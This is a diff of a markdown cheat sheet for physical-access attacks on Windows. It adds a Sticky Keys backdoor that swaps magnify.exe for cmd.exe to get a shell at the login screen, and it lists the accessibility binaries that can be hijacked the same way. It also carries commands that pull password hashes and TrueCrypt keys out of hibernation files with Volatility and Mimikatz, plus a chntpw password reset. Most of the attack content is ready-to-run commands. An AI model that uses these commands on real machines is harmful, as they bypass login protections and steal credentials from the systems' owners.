@@ -1,3 +1,16 @@
+## Sticky Keys ##
+```
+# Backup a binary and replace with cmd
+Ren c:\windows\system32\magnify.exe c:\windows\system32\magnify.exe.bak
+Copy c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe
+
+# Binaries to invoke
+• SETHC: sethc.exe is invoked when SHIFT is pressed 5 times
+• UTILMAN: Utilman.exe is invoked by pressing WINDOWS+U
+• OSK: osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard
+• DISP: DisplaySwitch.exe is invoked by pressing WINDOWS+P
+```
+
 ## Method chtpw ##
 ```
 # Open File Manager and click on "other locations" in bottom left
@@ -12,15 +25,21 @@ chntpw -u Administrator SAM
 ```
 # This file is in the root of the drive: c:\hiberfyl.sys.
 The basic tool for the task is Volatility; with it we can do the following things:
-• Obtaining information about the hibernation file: vol.exe hibinfo -f hiberfil.sys
-• Convert it to raw format: vol.exe imagecopy -f hiberfil.sys -O hiberfil.bin
-• Convert it to DMP format (Windbg compatible): vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp
-• Obtaining the browsing history: vol.exe iehistory -f hiberfil.sys
-• Obtaining local password hashes: vol.exe hashdump -f hiberfil.sys
-• Obtaining Truecrypt cryptographic keys: vol.exe truecryptpassphrase -f hiberfil.sys
+• Obtaining information about the hibernation file: 
+vol.exe hibinfo -f hiberfil.sys
+• Convert it to raw format: 
+vol.exe imagecopy -f hiberfil.sys -O hiberfil.bin
+• Convert it to DMP format (Windbg compatible): 
+vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp
+• Obtaining the browsing history: 
+vol.exe iehistory -f hiberfil.sys
+• Obtaining local password hashes: 
+vol.exe hashdump -f hiberfil.sys
+• Obtaining Truecrypt cryptographic keys: 
+vol.exe truecryptpassphrase -f hiberfil.sys
 ```
 
-## Method: Using mimikatz ##
+## Method: Hibernation File and Mimikatz ##
 ```
 Despite we have a Mimikatz plugin for Volatility, it is very limited so it’s better to work directly with Mimikatz. For that we have to:
 • Convert the hiberfil.sys file to a format compatible with Windbg (DMP):
@@ -43,4 +62,6 @@ Despite we have a Mimikatz plugin for Volatility, it is very limited so it’s b
 ## References ##
 ```
 https://www.pentester.es/evil-maid-attacks-with-hibernation/
+https://book.hacktricks.xyz/hardware-physical-access/physical-attacks
+https://www.red-gate.com/simple-talk/sysadmin/general/game-over-gaining-physical-access-to-a-computer/
 ```
